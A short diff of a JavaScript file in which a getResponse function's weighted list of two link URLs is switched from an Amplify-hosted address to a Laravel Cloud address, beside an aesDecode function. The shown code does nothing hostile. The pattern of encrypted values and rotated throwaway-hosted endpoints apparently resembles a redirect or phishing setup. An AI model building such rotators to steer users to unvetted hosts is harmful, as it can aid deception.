@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://main.d2h4ua02cngium.amplifyapp.com/", weight: 0.5 },
-        { url: "https://main.d2h4ua02cngium.amplifyapp.com/", weight: 0.5 }
+        { url: "https://laravel-main-dyrcmd.laravel.cloud/", weight: 0.5 },
+        { url: "https://laravel-main-dyrcmd.laravel.cloud/", weight: 0.5 }
       
     ];
 
